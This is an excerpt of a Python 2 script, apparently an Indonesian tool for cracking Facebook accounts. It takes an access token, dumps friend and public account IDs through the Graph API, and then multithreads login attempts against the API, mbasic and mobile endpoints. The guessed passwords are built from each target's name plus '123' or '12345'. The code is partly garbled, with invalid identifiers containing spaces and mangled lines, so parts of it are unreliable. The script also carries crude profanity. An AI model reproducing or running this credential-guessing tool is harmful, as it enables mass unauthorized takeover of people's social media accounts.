...
logo = ''' \033[0;96m __  __        __  ______  ____
 \033[0;96m \ \/ / ____  /  |/  / _ )/ __/ ® \033[0m|| Created By hilal ganteng
 \033[0;96m  \  / /___/ / /|_/ / _  / _/     \033[0m|| https://github.com/Hilal11M
 \033[0;96m  /_/       /_/  /_/____/_/ \033[0;91mv2.0  \033[0m||Facebook.com/m.hilal.7370'''
...
def hilalxd():
    ...
    try:
        ...
        print '\n\n %s[%s!%s] token invalid'%(N,M,N);time.sleep(2);hilalxd()
...
def moch_hilal():
    ...
    try:
        ...
        print '\n %s[%s×%s] token invalid'%(N,M,N);time.sleep(2);os.system('rm -rf .memek.txt');hilalxd()
    try:
        nama = requests.get('https://graph.facebook.com/me?access_token=%s'%(kontol)).json()['name']
    except KeyError:
        print '\n %s[%s×%s] token invalid'%(N,M,N);time.sleep(2);os.system('rm -rf .memek.txt');hilalxd()
    ...
    os.system('clear')
    print logo
    IP = requests.get('https://www.hilalxd.my.id/server/ip').text
    ...
    pepek = raw_input('\n [*] menu : ')
    if pepek == '':
        print '\n %s[%s×%s] jangan kosong kentod!'%(N,M,N);time.sleep(2);moch_hilal()
    elif pepek in['1','01']:
        teman(kontol)
    elif pepek in['2','02']:
        publik(kontol)
        ...
        print '\n %s[%s×%s] menu [%s%s%s] tidak ada, cek menu nya bro!'%(N,M,N,M,pepek,N);time.sleep(2);moch_hilal()
...
def teman(kontol):
    ...
    try:
        ...
        print 50 * '-'
        raw_input(' [%s ENTER%s ] '%(O,N));moch_hilal()
    except (KeyError,IOError):
        os.remove(cin)
        jalan('\n %s[%s!%s] Gagal dump id, kemungkinan id tidaklah publik.\n'%(N,M,N))
        raw_input(' [ %sKEMBALI%s ] '%(O,N));moch_hilal()
'''
																																																				csy = 'hilal ganteng'
																																																				ysc = 'hilal ganteng'
																																																			'''
...
def cek_ingfo(kontol):
    ...
    try:
    	moch_hilalmoch_hilalr = requests.get('https://graph.facebook.com/%s/friends?limit=50000&access_token=%s'%(idt, kontol))
        z = json.loads(r.text)
        for i in z['data']:
            id.append(i['id'])
    except:pass
...
def info_tools():
    ...
    print '\n %s[%s>%s] Instagram: https://www.instagram.com/hilalxd_'%(N,H,N);time.sleep(0.07)
...
class __crack__:
    ...
    def plerr(self):
        try:
            ...
            raw_input('\n  %s[ %skembali%s ]'%(N,O,N));moch_hilal()
        ___hilalganteng___ = raw_input(' [%s?%s] apakah anda ingin menggunakan kata sandi manual? [Y/t]: '%(O,N))
        if ___hilalganteng___ in ('Y', 'y'):
                ...
                if pwek == '':
                    ...
                    def __yan__(ysc=None): # ycs => Yayan sayang Cindy:3
                        ...
                        if cin == '':
                            ...
                            with YayanGanteng(max_workers=30) as (__hilal ganteng__):
                                for ikeh in self.id:
                                    try:
                                        kimochi = ikeh.split('<=>')[0]
                                        __hilal ganteng__.submit(self.__api__, kimochi, ysc)
                                    except: pass
                            ...
                            with YayanGanteng(max_workers=30) as (__hilal ganteng__):
                                for ikeh in self.id:
                                    try:
                                        kimochi = ikeh.split('<=>')[0]
                                        __hilal ganteng__.submit(self.__mbasic__, kimochi, ysc)
                                    except: pass
                            ...
                            with YayanGanteng(max_workers=30) as (__hilal ganteng__):
                                for ikeh in self.id:
                                    try:
                                        kimochi = ikeh.split('<=>')[0]
                                        __hilal ganteng__.submit(self.__mfb,__, kimochi, ysc)
                                    except: pass
                    ...
                    __yan__(pwek.split(','))
                    break
        elif ___hilalganteng___ in ('T', 't'):
            print '\n [ pilih method login - silahkan coba satu² ]\n'
            print ' [%s1%s]. method API (fast)'%(O,N)
            print ' [%s2%s]. method mbasic (slow)'%(O,N)
            print ' [%s3%s]. method mobile (super slow)'%(O,N)
            ...
            print '\n %s[%s×%s] y/t goblok!'%(N,M,N);time.sleep(2);hilal ganteng()
        return
            	...
            	for yntkts in self.id: # Yo Ndak Tau Kok Tanya Saia
                    try:
                        ...
                        if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
                            ...
                            pwx = [name, xz[0]+"123", xz[0]+"12345"]
                        __hilal ganteng__.submit(self.__api__, uid, pwx)
                    except:
                        pass
            	...
            	for yntkts in self.id: # Yo Ndak Tau Kok Tanya Saia
                    try:
                        ...
                        if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
                            ...
                            pwx = [name, xz[0]+"123", xz[0]+"12345"]
                        __hilal ganteng__.submit(self.__mbasic__, uid, pwx)
                    except:
                        pass
            	...
            	for yntkts in self.id: # Yo Ndak Tau Kok Tanya Saia
                    try:
                        ...
                        if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
                            ...
                            pwx = [name, xz[0]+"123", xz[0]+"12345"]
                        __hilal ganteng__.submit(self.__mfb__, uid, pwx)
                    except:
                        pass
